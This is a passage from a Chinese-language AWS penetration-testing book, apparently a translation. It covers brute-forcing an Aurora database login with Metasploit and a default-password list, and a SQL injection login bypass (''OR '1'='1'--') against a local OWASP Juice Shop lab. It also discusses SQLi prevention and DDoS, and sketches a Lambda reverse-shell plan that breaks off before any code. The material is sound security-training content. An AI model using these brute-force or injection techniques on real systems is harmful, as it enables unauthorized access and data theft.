$ wget https://raw.githubusercontent.com/PacktPublishing/AWS-Penetration-Testing/master/Chapter%206%3A%20Setting%20up%20and%20pentesting%20AWS%20Aurora%20RDS/mssql-betterdefaultpasslist.txt
```

1.  如果您打开文件，您会注意到列表中既有用户名又有密码 – 我们只需要密码。我们可以使用`awk`命令来切片和打印出密码，并将其存储在一个新文件中：

```
$ cat mssql-betterdefaultpasslist.txt | awk -F: {'print $2'} > AuroraPasswords.txt
```

1.  现在我们已经生成了密码列表，是时候来看一看是否可以获取到 Aurora 的用户名和密码了。我们将使用 Metasploit 来执行这个任务。首先，您需要启动 Metasploit：

```
$ msfdb run
```

1.  接下来，我们将加载`mysql`登录扫描器：

```
$ use auxiliary/scanner/mysql/mysql_login
```

1.  一旦您加载了您的模块，您需要设置一些参数。就像在[*第五章*]（B15630_05_Final_ASB_ePub.xhtml#_idTextAnchor227）中一样，*了解易受攻击的 RDS 服务*，设置以下参数：

```
Set RHOSTS <<aurora instance>>
Set USERNAME admin
Set STOP_ON_SUCCESS true
Set PASS_FILE AuroraPasswords.txt 
```

1.  一旦您设置好所有参数，使用`run`命令来执行针对 Aurora 主机的扫描：

![图 6.7 – 密码暴力破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.07_B15630.jpg)

图 6.7 – 密码暴力破解

我们已成功枚举了用户名和密码：

+   `admin`

+   `password`

重要提示

使用默认密码非常危险！确保在发现时报告默认用户名和密码。适当的纠正措施是将密码和用户名更改为符合**强**用户名和密码准则的内容。

从这里开始，我们有了可以让我们访问和拥有所有权限的凭据。这将允许我们删除数据库和表，以及添加我们自己的后门。强调发现弱凭据所涉及的问题非常重要，因为正如您所看到的，我们能够接管数据库！

现在我们对后端的工作原理有了更好的理解，让我们来看看如何通过建立我们自己的易受攻击的网站来（合法地）攻击前端。

# 为 SQLi 设置实验室

我们接下来要做的练习涉及设置一个 EC2 实例，安装一个易受攻击的 Web 程序，并在您的 EC2 实例上安装 Docker 服务。一旦一切就绪，我们将开始研究一些实际的 SQLi，并测试 Web 应用程序的易受攻击区域。

我们正在安装的易受攻击的应用程序**Juice Shop**是一个非常受欢迎的 Web 应用程序，充满了不同难度级别的黑客挑战 – 它甚至配备了一个黑客仪表板，您可以用来跟踪您的进度。要了解更多关于这个应用程序的信息，OWASP 有一个页面，上面有关于该项目的有用信息（[`owasp.org/www-project-juice-shop/`](https://owasp.org/www-project-juice-shop/)）。

重要提示

这个练习不涉及 Aurora – 它涉及 SQLi 和渗透测试参数，您可能会在使用 Aurora 的网站上看到。这个练习的目的是更加熟悉 SQLi 以及它的危险性。

首先，您需要设置一个 EC2 实例。到目前为止，您应该已经熟悉了如何设置实例；但是，如果您需要复习，请参考[*第一章*]（B15630_01_Final_ASB_ePub.xhtml#_idTextAnchor025），*构建您的 AWS 环境*！

一旦您在 EC2 仪表板上，请按照以下步骤启动和运行您的实例：

1.  点击**启动实例**。

1.  选择一个**Amazon 机器映像**（**AMI**）。我们使用的 AMI 是**Amazon ECS-优化的 Amazon Linux 2 AMI**：![图 6.8-选择 SQLi 实验的正确镜像](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.08_B15630.jpg)

图 6.8-选择 SQLi 实验的正确镜像

1.  配置**实例详细信息**，展开**高级详细信息**，并将以下脚本复制到**用户数据**中：

```
#!/bin/bash
yum update -y
yum install -y docker
service docker start
docker pull bkimminich/juice-shop
docker run -d -p 80:3000 bkimminich/juice-shop
```

1.  当您到达安全组时，请确保端口`80`对所有传入和传出流量都是开放的。

1.  启动您的实例。

1.  打开浏览器，搜索您的 EC2 实例的公共 DNS 名称。这样做的最简单方法是右键单击实例，然后选择包含*步骤 3*中脚本的`.sh`脚本。

您可能无法通过 HTTP 连接。常见问题是在设置 EC2 时错误配置安全组。如果无法通过 HTTP 连接，请确保您的安全组允许连接。请参考以下截图，并确保您的安全组设置正确：

![图 6.9-安全组仪表板](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.09_B15630.jpg)

图 6.9-安全组仪表板

设置完成后，连接到您的网络浏览器中的公共 DNS，您应该看到果汁店的主仪表板。要查看应用程序，请将 EC2 实例的公共 DNS 名称放入浏览器中，然后点击*Enter*：

![图 6.10-果汁店仪表板](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.10_B15630.jpg)

图 6.10-果汁店仪表板

干得好，我们已经成功在 AWS 中建立了我们自己的易受攻击的实验室。在我们继续之前，让我们看看在我们开始渗透测试之前可以做的一些快速清理工作。

## 配置果汁店自动启动

在我们继续之前，我们想做一个快速的**清理**步骤，这将自动为我们启动果汁店，每当我们的 EC2 实例启动时。每次启动实例时手动启动服务可能会很麻烦，这有助于节省我们的一些时间，这样我们就不必总是手动启动服务每当我们上线实例时。

让我们将其分解为以下步骤：

1.  您需要制作一个一行脚本，可以在启动时启动。我们可以通过两种不同的方式来做到这一点。首先，转到`init.d`目录：

```
$ cd /etc/init.d 
```

1.  一旦您进入目录，制作一个脚本，`init`可以在启动时调用。在这种情况下，我们将称之为`juiceShop.sh`：

```
$ sudo vi juiceShop.sh
```

1.  将以下脚本放入文件中并保存：

```
#!/bin/bash
sudo sudo docker run -d -p 80:3000 bkimminich/juice-shop
```

另一种方法是将其添加到实例的**cron 作业**中。cron 作业是用户可以在 Unix 操作系统上安排的基于时间的作业。**作业**是用户设置为以任何间隔运行的任务。在我们的情况下，我们希望果汁店在实例启动时运行。要做到这一点，请在您的 EC2 终端中键入以下命令：

```
$ @reboot sudo sudo docker run -d -p 80:3000 bkimminich/juice-shop
```

现在，我们有一个带有可用版本的果汁店的实例，可以开始测试 SQLi！在继续之前，请确保您的实例在启动时自动启动果汁店，方法是重新启动实例。

现在，让我们开始执行 SQLi 并对我们的易受攻击实例进行渗透测试。

# SQLi 的乐趣

现在我们已经准备好了，让我们继续对易受攻击的 Web 应用程序果汁店进行一些渗透测试。如果您需要了解 SQLi 是什么以及它是如何工作的，请查看*第五章*，*了解易受攻击的 RDS 服务*。

在我们开始之前，我们需要确保一些事情：

1.  我们的带有果汁店的 EC2 实例已经启动，并且可以通过 Web 浏览器访问。这将确保我们可以在接下来的练习中访问它。

1.  我们的*本地* Kali Linux 虚拟机在虚拟盒中启动。

完成了这两个步骤后，继续前往果汁店 EC2 实例的公共 DNS。接下来，让我们转到*记分牌*，看看 Web 应用程序上有哪些挑战。

在您的网络浏览器中转到目录：http://<<public dns>>/#/score-board/：

![图 6.11-果汁店记分牌](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.11_B15630.jpg)

图 6.11 - Juice Shop 记分牌

重要提示

在 Web 应用程序中找到`/score-board`是一个挑战。如果您想尝试各种方法来找到它，我建议使用目录搜索工具，如`gobuster`，`dirb`或`dirbuster`。

正如您所看到的，我们有很多挑战可供选择。我们只会专注于注入挑战；但是，也可以随意查看其他挑战。由于我们只想执行注入任务，因此单击**隐藏所有**以删除所有任务 - 这应该会使所有挑战消失。一旦所有任务都消失了，单击**注入** - 这将使所有注入挑战出现：

![图 6.12 - 仅带注入的 Juice Shop 记分牌](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.12_B15630.jpg)

图 6.12 - 仅带注入的 Juice Shop 记分牌

正如您所看到的，我们有一个广泛的挑战列表可供选择。每个挑战旁边都有一些星星 - 这些星星表示每个挑战的难度。星星越多，挑战就越困难。让我们将每个挑战都作为我们在实际渗透测试中会遇到的任务。

我们的第一个挑战将是绕过管理员登录提示并获得对 Web 应用程序的管理员访问权限。

## 绕过管理员登录

好的，让我们从一个简单的挑战开始，这在渗透测试中通常是一个实际的“在范围内”任务。在范围内的任务是允许的（在范围内）并且在渗透测试期间是必需的（任务）。这意味着客户希望您就特定任务（如结果、手动评估和关注的领域）提供反馈。在我们的情况下，我们需要就 Web 应用程序以及我们如何测试它以及如何进行修复提供反馈。

所以，让我们假设 Juice Shop 开设了一个在 AWS 内运行的新商店。他们希望我们测试登录页面的功能，并查看它是否容易受到任何注入的攻击。这样做有助于让 Juice Shop 了解他们的 Web 应用程序有多安全，以及他们需要修复什么。这是一种积极的方法，因为他们希望我们评估安全性，而不是合规性。

重要提示

测试合规性并不意味着您正在测试安全性。测试合规性意味着遵循一份检查清单，以测试在整体方案中可能或可能不是“安全”的项目。

让我们开始渗透测试吧！

1.  首先，我们需要进入登录页面。登录页面可以在以下位置找到：

```
<<public dns>>/#/login
```

我们将看到以下屏幕：

![图 6.13 - Juice Shop 的登录页面](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.13_B15630.jpg)

图 6.13 - Juice Shop 的登录页面

很好，现在我们有了登录页面。

1.  接下来，让我们测试一些奇怪的参数，看看登录页面是否正确处理输入。为了测试登录输入功能，请在用户名字段中输入`'`。密码可以是任何您想要的东西：

![图 6.14 - 检查错误](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.14_B15630.jpg)

图 6.14 - 检查错误

然后，我们得到了一个错误，如下所示。

![图 6.15 - 输入错误](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.15_B15630.jpg)

图 6.15 - 输入错误

您可以看到它给了我们一个关于对象的错误。这告诉我们它没有处理输入验证 - 但它并没有真正告诉我们它是什么类型的语法错误。从这里开始，我们需要对我们需要使用的语法类型进行一些猜测来执行注入。

我们将尝试使用一个简单的`TRUE`语句，这可能会让我们以管理员身份访问网站。就像以前一样，在这种情况下，密码并不重要。我们关注的是电子邮件字段的输入。在电子邮件字段中，输入以下真实语句：`'OR '1'='1'--`：

![图 6.16 - 测试 SQLi](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.16_B15630.jpg)

图 6.16 - 测试 SQLi

在上一个截图中，您可以看到我们有管理员访问权限！这是因为输入字段不会对输入进行消毒，并且只要语句为真，就会执行任何输入。在我们的情况下，`1=1`为真，因此命令被处理。如果您需要回顾 SQLi，请返回*第五章*，*了解易受攻击的 RDS 服务*，进行复习。

既然我们看到我们可以作为管理员登录，让我们看看这对非管理员用户有何影响。接下来，我们将看到我们可以以何种类型的用户身份登录。

## 以另一个用户身份登录

既然我们已经获得了管理员访问权限，让我们看看是否可以转变并以其他用户身份登录。在后期妥协后能够展示内部移动对于渗透测试和报告至关重要。如果您能够在网络中进行转变并在不被注意的情况下占有其他帐户，这将告诉客户他们的检测流程有多好。

重要说明

报告缺乏检测和警报是渗透测试的重要部分。如果目标没有标记您并发送警报，那么这意味着他们不会看到网络内部的攻击者。

有一个名为`bender`的用户可能在其帐户上有有价值的信息。出于密集的目的，我们将看到我们被指定找到一个用户，并在侦察期间找到了他，使用诸如`theHarvester`之类的工具。有人要求我们看看是否能够控制这个帐户。为了测试这一点，我们首先需要看看 Juice Shop 的电子邮件命名规则是什么：

![图 6.17 – 获取电子邮件方案](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.17_B15630.jpg)

图 6.17 – 获取电子邮件方案

成功的侦察后，我们看到电子邮件地址域为`@juice-sh.op`。现在，我们可以回到登录页面，并使用与之前相同的方法进行测试：

![图 6.18 – 使用 benders 帐户测试 SQLi](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.18_B15630.jpg)

图 6.18 – 使用 benders 帐户测试 SQLi

您将看到类似于这样的横幅：

*您成功解决了挑战：登录 Bender*

我们现在已成功完成分配给我们的任务，并将能够提交关于我们如何成功获取管理员帐户和`bender`用户帐户的报告。

既然我们已经执行了一些 SQLi 并执行了它，让我们开始了解如何防止它以及我们如何告诉客户和企业他们如何帮助减轻其组织内的潜在问题。

## 防止 SQLi

让我们就如何防止 SQLi 进行快速讨论。正如我们之前所看到的，如果没有正确地减轻，SQLi 可能是一种简单的策略，可以给攻击者带来*王国的钥匙*。既然我们已经亲身经历了这一点，让我们看看如何防止它！

在评估 Juice Shop 时，我们能够通过在**电子邮件**字段中输入真实语句来利用该应用程序。由于**电子邮件**部分的输入字段未被**参数化**，SQLi 是成功的。下面的示例说明了糟糕的查询和良好的查询语句。这些语句在实际数据库中：

```
username = "SELECT * FROM users WHERE email = '" + email + "'";
username = "SELECT * FROM users WHERE email = ?";
```

这两个查询都将被执行；但是，**第二个**查询只使用了电子邮件查询，而不是第一个查询，它查看了正在传递的整个参数，并将命令解释为整个 SQL 查询。这就是我们能够控制 Juice Shop 管理员帐户的方式。与其处理整个字符串，不如使用 SQL 语句加上电子邮件构造语句。 

既然我们已经看到了 SQLi 的工作原理和减轻方法，让我们看看如何减轻可能发生在您的 AWS 企业中的最危险的攻击之一：**DoS**！

# 避免 DoS

**DoS**是一个严重的网络应用程序漏洞，它有能力破坏服务和应用程序的可用性。DoS 的目标是关闭目标网络、服务或应用程序，并使其对用户和管理员不可访问 - 然而，最终，用户是主要的目标受众。

一种更复杂和破坏性更强的 DoS 攻击版本是**DDoS**攻击 - 使用多个攻击者机器攻击目标主机。DDoS 攻击通常是高技能和计划周密的攻击，利用僵尸网络向目标释放大量不需要的流量。

重要提示

僵尸网络是一大批被攻击者控制的受损计算机，用于进行对计算机所有者不知情的恶意攻击。

DDoS 攻击有两个非常明显的分类：

+   基础设施层攻击

+   应用层攻击

让我们快速看一下这两个分类的细节。虽然我们在 AWS 中无法实际进行 DoS 攻击，但了解这些分类并看看如何最大程度地减少 AWS 环境成为 DoS 或 DDoS 受害者的机会仍然是很好的。

## 基础设施层攻击

这一层的攻击通常是 SYN 洪水等攻击，以及耗尽受害主机资源的其他攻击。它们通过向目标发送大量的流量来使其不可用。这些类型的攻击通常不会在渗透测试期间使用，因为如果成功，它们将完全关闭客户的基础设施。然而，查找可能表明客户基础设施没有准备好处理 DoS 攻击的指标仍然是一个好的做法，比如没有检测到来自多个主机的格式错误数据包，或者没有检测到 DDoS 攻击使用的某些特定签名。

## 应用层攻击

这种类型的攻击是您可能会看到的较少的攻击向量；然而，在渗透测试中，这是您可能真正要做的事情。应用层的攻击涉及查看一个应用程序，而不是整个公司，并且试图在可能的情况下“破坏”应用程序。在渗透测试中，对应用程序进行 DoS 攻击可能是对应用程序进行模糊测试，直到应用程序出错并且无法再运行。这在**缓冲区溢出**中是一种极为常见的技术。

虽然我们不会在本书中深入研究缓冲区溢出，但我强烈建议您查看一些适合初学者的练习，这些练习将帮助您熟悉这个概念（[`github.com/stephenbradshaw/vulnserver`](https://github.com/stephenbradshaw/vulnserver)）。

## 在 AWS 中防范 DDoS 攻击

现在我们了解了 DDoS 可能给企业带来的问题，至关重要的是我们了解一些如何保护免受破坏式攻击的概念。确保您的基础设施周围有防范不受欢迎的流量的保护措施，并且有规则限制只允许必要的流量是很重要的。您的客户业务需要了解什么是正常流量，什么不是正常流量。

备份和扩展对于确保您免受 DDoS 攻击的保护至关重要。如果已经实施了适当的扩展，另一个系统可以在另一个系统由于错误或攻击而崩溃时接管工作。AWS 有一个名为**AWS Shield**的应用程序 - 一个出色的 DDoS 管理应用程序（[`aws.amazon.com/shield/`](https://aws.amazon.com/shield/)）。

使用**Web 应用程序防火墙**（**WAFs**）是保护您拥有的任何公共面向 Web 的应用程序的绝佳方式，特别是如果它们用于员工和客户。AWS WAF 提供可定制的 Web 安全，允许管理员在它们甚至到达 Web 应用程序之前识别和消除目标。

# 总结

在本章中，我们学习了关于 Aurora 及其在 AWS 中的用途。我们设置了自己的 Aurora 实例，并学习了如何使用常见的渗透测试技术来寻找配置错误。接下来，我们学习了如何在 EC2 实例中设置 SQLi 实验室，并练习了一些在实际渗透测试中会遇到的常见注入方法。最后，我们讨论了 DoS 攻击及其对业务的影响。

现在您已经完成了本章，您可以在 AWS 中设置自己的实验室，以便在安全和授权的环境中测试 SQLi 攻击，并了解渗透测试 Amazon Aurora 的基础知识。

在下一章中，我们将介绍 Lambda 服务，并学习如何在 Lambda 中寻找配置错误。

# 进一步阅读

+   Aurora 查询：[`docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/aurora-mysql-parallel-query.html`](https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/aurora-mysql-parallel-query.html)

+   在 AWS 中设置 WordPress：[`docs.aws.amazon.com/elasticbeanstalk/latest/dg/php-hawordpress-tutorial.html`](https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/php-hawordpress-tutorial.html)


# 第七章：评估和渗透 Lambda 服务

Lambda 服务运行代码，稍后可以根据需要在 Lambda 环境内响应事件和其他任务。这些事件和任务是发生在 AWS 环境内的任何事情-HTTP 请求、对 S3 存储桶的修改，以及例如新的 EC2 实例被启动。这使得 Lambda 在为组织设置和扩展网络及其服务时成为一个重要的服务。然而，Lambda 确实存在一些问题，比如对访问 Lambda 的限制较弱，可以执行未经授权的操作的易受攻击的函数，以及允许发生利用的 Lambda 策略内建规则。

本章将重点介绍 Lambda 中的漏洞发现如何导致利用服务以及发现内部流程和对象。

在本章中，我们将涵盖以下主题：

+   理解和设置 Lambda 服务

+   深入了解 Lambda

+   理解错误配置

+   使用 Lambda 进行反向 shell 弹出

# 技术要求

本章中使用的代码可在以下链接找到：[`github.com/PacktPublishing/AWS-Penetration-Testing/tree/master/Chapter%207:%20Assessing%20and%20Pentesting%20Lambda%20Services`](https://github.com/PacktPublishing/AWS-Penetration-Testing/tree/master/Chapter%207:%20Assessing%20and%20Pentesting%20Lambda%20Services)。

你还需要在具有公共 DNS 名称的 EC2 实例上安装 Kali Linux。

查看以下视频以查看代码的实际操作：[`bit.ly/35XHn7Q`](https://bit.ly/35XHn7Q)

# 理解和设置 Lambda 服务

欢迎来到 Lambda，在这里您的代码将在一个易于运行和管理的服务器上执行。Lambda 对于公司来说是简化运维和开发人员工作的绝佳方式，因为 Lambda 可以大幅度扩展和自动化基础架构。它允许代码仅在需要执行时执行，并可以帮助自动化其他服务，这样您就不必担心所有的维护工作！

让我们看看如何设置 Lambda 函数！

## 创建 Lambda 函数

Lambda 函数很像 Python 函数，因为它们执行其中构建的代码，而不是在外部执行。在 Python 中，这就是我们所谓的**内部**和**全局**语法。内部语法是在函数内部构建的代码，只能在函数内部运行，而全局语法可以在函数外部运行。Lambda 函数在函数内部运行所有内容。这些函数用于自动化、扩展和处理中间的所有事情。虽然我们不打算讨论使用 Lambda 函数的各种原因，但您可以在亚马逊上找到大量关于 Lambda 可能性的资源。要了解更多信息，请查看 AWS 关于 AWS Lambda 的广泛信息资源：[`docs.aws.amazon.com/lambda/latest/dg/welcome.html`](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html)。

让我们重新登录到 AWS 控制台，并将 Lambda 仪表板快捷方式固定到我们的主仪表板上。将 Lambda 函数图标固定在那里将使我们更容易地引用 Lambda 部分，因为我们在定位 Lambda 时不必浏览所有服务。

以下步骤帮助我们创建 Lambda 函数：

1.  转到 AWS 控制台并搜索`Lambda`：![图 7.1-将 Lambda 固定到 AWS 控制台](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.01_B15630.jpg)

图 7.1-将 Lambda 固定到 AWS 控制台

1.  一旦您有了 Lambda 的快捷方式，就可以点击它；让我们开始制作一个可以测试的函数。当您进入 Lambda 仪表板时，点击`testFunction`。**Runtime**选项将使用**Python 3.6**，这将是我们编写代码的环境：

![图 7.2-从头创建 Lambda 函数](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.02_B15630.jpg)

图 7.2-从头创建 Lambda 函数

完成后，您将看到可以保存和“测试”函数的位置。虽然查看函数配置管理器中的部分很重要，但现在我们不会太担心这个，因为它与我们正在做的事情关系不大。重要的是，我们了解在 AWS 控制台中如何设置 Lambda 的位置和方式-就像我们刚刚做的那样，并且在本章中将会更多地进行。

重要提示

有关 Lambda 的更多信息，请查看 AWS 文档：[`docs.aws.amazon.com/lex/latest/dg/gs-bp-create-lambda-function.html`](https://docs.aws.amazon.com/lex/latest/dg/gs-bp-create-lambda-function.html)。

让我们在下一节中进一步了解这些知识，并开始研究安全工程师和渗透测试人员如何使用某些技术来发现 Lambda 中的配置错误。

# 深入研究 Lambda

现在我们已经简要介绍了 Lambda 是什么，以及如何设置我们自己的 Lambda 服务，是时候开始研究 Lambda 的一些安全问题了。在实际的渗透测试过程中，您可能会遇到其中一些问题。在 AWS 方面，我作为渗透测试人员看到的最重要的问题之一是与 Lambda 相关的策略问题。策略是限制和允许访问资源的东西，类似于我们在*第四章**，利用 S3 存储桶*中所看到的。在本节中，我们将使用相同的*方法论*做一些事情，但我们将研究 Lambda 的配置错误。

重要提示

您将开始注意到，虽然本书中每一章的目标都不同，但方法论基本上是相同的，因为我们使用相同的步骤从目标中提取结果。

让我们开始向前迈进，学习更多的概念，并在 Lambda 中开始构建一些东西。让我们首先创建一个与 S3 配合工作的 Lambda 函数。

## 创建一个与 S3 兼容的 Lambda 函数

在本节中，我们将继续构建。了解 Lambda 服务及其功能是非常重要的。在这种情况下，它能够链接在渗透测试过程中可能成为潜在**枢纽**点的服务。

重要提示

枢纽是在获得访问权限后在环境中进行横向移动的过程。

我们要做的是开始研究 Lambda 和 S3 如何协同工作，然后我们可以看一些配置错误，如果不正确地进行缓解可能会导致一些问题。在我们利用系统之前，了解系统是如何创建的是至关重要的。这样做可以让我们能够采取“实践”方法来缓解这些问题，也有助于我们了解如何在各种服务之间进行流程中断，比如 S3 和 Lambda。

这是您可以期待的内容：

1.  **创建一个 S3 存储桶**：此存储桶将与 Lambda 函数关联。

1.  **创建一个 Lambda 函数**：Lambda 函数将作为 S3 存储桶的触发器进行集成。

1.  **将函数与 S3 集成**。

1.  **开始探索**我们从渗透测试的角度创建的东西。

现在让我们开始吧！按照以下步骤进行：

1.  首先，我们将使用 AWS 命令行创建我们的 S3 存储桶，并通过从 AWS 控制台查看它来验证我们的存储桶是否已创建-这是我认为的最佳实践。确保您随身携带您的 AWS ID 和 AWS 账户的 AWS 密钥。一旦您获得了您的凭据，使用`aws configure`命令登录到您的 AWS 环境。

重要提示

如果您需要帮助找到您的密钥，这是一个很好的参考资料，您可以使用它进行帮助：[`aws.amazon.com/blogs/security/how-to-find-update-access-keys-password-mfa-aws-management-console/`](https://aws.amazon.com/blogs/security/how-to-find-update-access-keys-password-mfa-aws-management-console/)。

1.  既然您已经进入环境，让我们开始创建一个存储桶！使用命令行，使用以下命令创建一个我们将存储在 AWS 环境中的存储桶：

```
$ aws s3api create-bucket --bucket pentestawslambda --region us-west-2 --create-bucket-configuration LocationConstraint=us-west-2
```

重要说明

您需要为存储桶名称使用自己独特的命名方案。此外，如果您不指定区域，它将默认放置在**美国东部**区域。

1.  完成使用命令行创建存储桶后，请登录到 AWS 控制台并验证存储桶是否已创建。我们可以通过检查 S3 存储桶仪表板来验证这一点：

![图 7.3–为 Lambda 创建的 S3 存储桶](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.03_B15630.jpg)

图 7.3–为 Lambda 创建的 S3 存储桶

现在我们已经设置好了我们的存储桶，是时候继续并创建另一个 Lambda 函数，我们可以通过触发器将我们的新存储桶连接到其中。这个存储桶将与我们创建的第一个 Lambda 函数有所不同，但现在您已经知道了设置 Lambda 函数的基本方法。

让我们从创建一个新函数并将其命名为`s3lambda`开始。请记住，您只能使用数字和小写字母！对于**Runtime**，请选择当前版本的 Python。在这个示例中，我们使用的是 Python 3.8。在点击**创建函数**之前，我们确实需要对我们的 Lambda 函数进行一些其他操作。

现在我们需要创建一个基本的权限角色，这将与我们的 Lambda 函数关联。要做到这一点，请按照以下步骤：

1.  点击`s3_pentesting_lambda`

--**策略模板**：**Amazon S3 对象只读权限**和**AWS Config 规则权限**：

![图 7.4–为 S3 创建一个新函数](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.04_B15630.jpg)

图 7.4–为 S3 创建一个新函数

1.  然后，我们需要继续在 Lambda 函数中**创建一个触发器**。这个函数是由 Lambda 环境中发生的事情触发的。点击**添加触发器**开始，并选择**S3**链接我们创建的名为**pentestawslambda**的存储桶并保存：

![图 7.5–创建一个 S3 触发器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.05_B15630.jpg)

图 7.5–创建一个 S3 触发器

干得好–我们已经创建了一个与触发器关联的新 Lambda 函数！重要的是要理解 Lambda 可以链接到其他环境，因为在真正的渗透测试中可能会遇到它。如果发现与其他服务连接的易受攻击的 Lambda 函数，请确保详细说明问题以及易受攻击的 Lambda 函数可能使其他服务变得更脆弱。

说到由配置错误导致的漏洞，让我们继续讨论 Lambda 中的配置错误。

# 了解配置错误

发现弱策略中的配置错误是渗透测试 AWS 服务（如 Lambda 和 S3）中更重要的部分之一。由于安全性已经“内置”在服务中，Lambda 中出现的许多问题是由于用户端的配置错误造成的。这并不意味着不会犯错误，也不意味着 Lambda 内部可能存在固有缺陷；然而，为了论证，我们将关注它的配置。

对于 Lambda 策略，**配置错误**发生在某个属性以“宽松”的方式设置时。 “宽松”一词意味着策略允许的内容超出了预期。这些策略是允许未经授权的个人查看未经其查看的信息，或者更糟糕的是，允许恶意向量查看和外泄数据的原因。

`列出`、`读取`、`写入`、`权限管理`或`标记`。在策略的操作中标有`"*"`的操作意味着任何人都可以在服务上执行操作，这是绝对不好的！

那么，是什么造成了这些宽松的策略，我们如何在 Lambda 中找到它们？这就是我们将要发现的。此外，我们将通过使用内置在 AWS CLI 中的工具来做到这一点。

首先，我们将开始查看我们使用 S3 创建的存储桶。回想一下，我们在创建 Lambda 函数并将其与存储桶集成时设置了一些相当“宽松”的权限。让我们看看它是如何轻松快速地升级到不被预期的情况的。

重要说明

在评估 Lambda 函数时，我们将进行 Lambda 和 S3 安全检查。

继续前进，让我们查询我们创建的 Lambda 函数的策略。这将为我们列出 Lambda 函数的属性：

```
$ aws lambda get-policy --function-name s3lambda --region us-west-2
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"lambda-74fa4b03-e053-47e0-bdee-0288118c1b3e\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"s3.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:030316125638:function:s3lambda\",\"Condition\":{\"StringEquals\":{\"AWS:SourceAccount\":\"030316125638\"},\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:s3:::pentestawslambda\"}}}]}",
    "RevisionId": "692f71fd-40d2-40f6-99b0-42c4e1d7a353"
}
```

如您所见，策略的布局非常简单明了。但是，如果您仔细观察，您会注意到有关此函数的一些有趣之处。在继续之前，让我们仔细看看这个函数。如果我们在渗透测试中拉取了类似于这个策略的东西，我们会得出以下结论：

+   允许**调用**函数的“允许”操作是允许的。虽然这很好，但我们通常不希望任何人都能这样做。允许任何人调用可能会在以后造成重大问题，因为如果有人成功入侵内部 AWS 网络，他们可能会继续运行 Lambda 函数。

+   我们还在策略中看到了`pentestawslambda` S3 存储桶。虽然这更多是信息性的，但它让我们知道了 S3 存储桶的完整 URL。攻击者可以使用这些信息来了解更多关于 S3 存储桶，或者发现可能存在于该环境中的更多存储桶。因此，IAM 策略等访问控制对于只允许那些需要知道的人能够访问 AWS 环境中的服务至关重要。

现在我们对如何渗透测试 Lambda 以及要注意的事项有了更多了解，让我们采取不同的方法，看看如何在 Lambda 环境中获得持久性访问。

# 使用 Lambda 弹出反向 shell

本章的最后一部分涵盖了我最喜欢的渗透测试部分之一。本节将指导我们设置一个易受攻击的 Lambda 函数，然后使用该函数在我们的渗透测试机器上启动反向连接。对于本节，我们需要使用以下内容：

+   Kali Linux 在具有公共 DNS 名称的 EC2 实例上

+   一个 Lambda 函数

重要说明

确保您正在使用具有公共 DNS 的 EC2 实例。 Lambda 函数将需要连接到该公共 DNS。

## 反向 shell 的酷炫之处

获取“shell”是渗透测试中最有成就感的部分之一。能够获得反向 shell 意味着您成功利用了目标并在该机器上获得了持久性（持久性是指在该机器上的终端连接）。但它不仅仅是一个连接；它还突显了被测试环境中的问题。例如，调用网络的服务器可能允许各种通常看不到的出站连接。这使得反向 shell 可以传送到公共网络。

### 渗透测试的 shell？

客户可能希望您测试其安全性的监控和检测。创建一个易受攻击的 Lambda 函数，使其在网络内部和外部进行调用，是测试公司监控实践和解决方案的绝佳方式，同时还可以与 Lambda 一起玩得开心。

获取 shell 远不止于*仅仅*获取 shell-它测试监控、防火墙规则和一般安全姿态。在渗透测试期间，如果您能够使用易受攻击的 Lambda 函数在网络外部获得反向 shell，可以假定网络内部的其他漏洞可能使用相同的路径呼叫网络外部。

现在我们更了解反向 shell，让我们看看如何设置一个易受攻击的 Lambda 函数，可以向我们回拨并允许远程访问 Lambda 环境。

重要说明

在继续之前，有必要知道 Lambda 按毫秒计费。如果您不断运行 Lambda 函数，将对其收费。

是时候使用 shell 了！

## 道德黑客游戏计划

现在让我们获取我们的 shell，现在我们对 shell 及其对渗透测试的影响有了一些了解。在实际执行之前，我们将看一下即将发生的事件顺序。在执行攻击路径时，事先制定游戏计划可能是一个好的做法：

1.  启动一个带有公共 DNS 的 EC2 实例。

1.  创建一个有漏洞的 Lambda 函数，将回调到公共 DNS。

1.  在 EC2 实例上启动一个监听器。

1.  测试并运行有漏洞的 Lambda 函数。

1.  获取一个 shell。

### 获取一个 shell

现在我们有了一个游戏计划，让我们继续并启动我们之前创建的 EC2 实例。一旦它运行起来，继续登录到我们的 Lambda 仪表板。现在让我们看看如何通过以下步骤继续执行：

